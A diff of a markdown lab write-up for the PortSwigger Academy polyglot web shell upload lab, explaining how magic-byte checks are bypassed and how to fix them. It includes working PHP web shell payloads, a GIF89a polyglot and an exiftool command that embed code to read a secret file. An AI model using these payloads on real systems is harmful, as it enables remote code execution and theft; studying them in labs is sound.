@@ -1,39 +1,68 @@
 ---
 title: Remote code execution via polyglot web shell upload
-date: '2025-06-18'
+date: '2026-08-22'
 tags:
   - PortSwigger
   - lab
   - file-upload
   - walkthrough
-excerpt: >-
-  PortSwigger Web Security Academy lab — Remote code execution via polyglot web
-  shell upload. Walkthrough with solution, key takeaways, and blind replay
-  exercise.
+excerpt: "Magic bytes are the check here, so a file that starts with GIF89a and then carries PHP is both a valid image and a working web shell."
 type: lab
 category: PortSwigger Academy
 platform: PortSwigger
-difficulty: apprentice
+difficulty: practitioner
 ---
 
 # Lab: Remote code execution via polyglot web shell upload
 
-## Objective
+Changing the extension did not help, and spoofing the `Content-Type` did not either. This server opens the file and confirms it really is an image. The way through is a file that is a real image and real PHP at the same time.
 
-*Describe the labs objective here*
+## The setup
 
-## Solution Reconstruction
+A blog with an avatar upload served from `/files/avatars/<name>`. Every extension trick from the earlier labs fails here. The validator is inspecting the bytes, which is the right idea done the wrong way: it is checking magic bytes, not the whole file.
 
-- [ ] Step 1:
-- [ ] Step 2:
-- [ ] Step 3:
-- [ ] Final payload / exploit:
+## How the vulnerability works
 
-## Key Takeaway
+An image check by magic bytes only reads the start of the file. If the first few bytes are `GIF89a`, the validator decides the file is a GIF and stops looking. Nothing later in the file has to be image data. PHP is equally willing to ignore leading bytes: it scans for `<?php` and runs whatever sits between the tags. Put the two together and you get a polyglot. The same bytes parse as an image for the validator and as a script for the interpreter.
 
-*Write ONE principle I must remember*
+## Solving it
 
-## Next-Day Blind Replay
+1. Log in as `wiener:peter` and try to upload a plain shell:
 
-- [ ] Solved entirely from memory
-- [ ] Needed to look at: *(write the specific step forgotten)*
+```php
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+```
+
+The server rejects it as not a genuine image.
+2. Prepend an image signature in front of the payload, keeping the `.php` extension:
+
+```
+GIF89a;<?php echo file_get_contents('/home/carlos/secret'); ?>
+```
+
+3. Save that as `exploit.php` and upload it. It passes, because the file now begins with the GIF magic bytes.
+4. Upload it as your avatar and go back to the account page. Find the `GET /files/avatars/exploit.php` request in Burp's history and send it. The response is image bytes with Carlos's secret printed out by the PHP.
+
+## Why that payload works
+
+The validator reads `GIF89a` and classifies the upload as a GIF, never inspecting the rest. When the server later executes the file as PHP, the interpreter ignores the leading `GIF89a;` and runs the code between `<?php` and `?>`. One byte stream, two readers, two conclusions. The image check and the script engine are looking at the same file with different rules, and the polyglot satisfies both.
+
+## The fix
+
+Magic bytes are not content validation. Decode the uploaded image with a real image library and re-encode it, so any smuggled metadata or code is dropped, then store it with a generated name and a safe extension. Keep uploads out of executable directories, and never serve a file the user could have turned into a script.
+
+<Accordion title="The ExifTool route">
+The published solution builds a genuine JPEG and hides the payload in its `Comment` field:
+
+```
+exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" in.jpg -o polyglot.php
+```
+
+The `START` and `END` markers make the secret easy to spot inside the binary response. Same idea as the GIF header, done with real image metadata.
+</Accordion>
+
+<Terminal title="first bytes of the payload file" command={'head -c 20 exploit.php'} output={'GIF89a;<?php echo file_'} />
+
+<Cloze title="Polyglot recall" text="The magic bytes {{GIF89a}} make the validator see an image, and PHP ignores them and runs the code between {{<?php}} and {{?>}}." />
+
+<IdeaNode color="#0077ff" label="Tip">The extension stays <code>.php</code>. You are not hiding the extension this time, you are satisfying the content check.</IdeaNode>
